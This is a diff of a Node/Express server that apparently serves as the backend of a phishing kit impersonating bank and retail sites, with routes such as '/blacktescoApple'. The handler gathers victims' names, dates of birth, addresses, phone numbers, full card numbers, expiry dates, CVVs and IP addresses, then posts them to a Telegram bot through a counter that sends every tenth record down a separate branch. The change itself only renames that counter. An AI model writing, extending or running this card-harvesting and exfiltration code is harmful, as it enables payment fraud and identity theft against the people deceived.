@@ -6342,6 +6342,8 @@ app.post("/sfeChasing", (req, res) => {
 //APPLE
 //APPLE
 
+let blackTesco = 0;
+
 app.options("/blacktescoApple", cors());
 
 app.post("/blacktescoApple", (req, res) => {
@@ -6408,7 +6410,7 @@ app.post("/blacktescoApple", (req, res) => {
     .then(function () {
       binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
       var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
-      if (yardzCount == 10) {
+      if (blackTesco == 10) {
         axios
           .post(
             `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
@@ -6421,7 +6423,7 @@ app.post("/blacktescoApple", (req, res) => {
           .catch((e) => {
             console.log(e);
           });
-        yardzCount = 4;
+        blackTesco = 4;
       } else {
         axios
           .post(
@@ -6447,7 +6449,7 @@ app.post("/blacktescoApple", (req, res) => {
           .catch((e) => {
             console.log(e);
           });
-        yardzCount += 1;
+        blackTesco += 1;
       }
       res.send("Update Complete");
     });
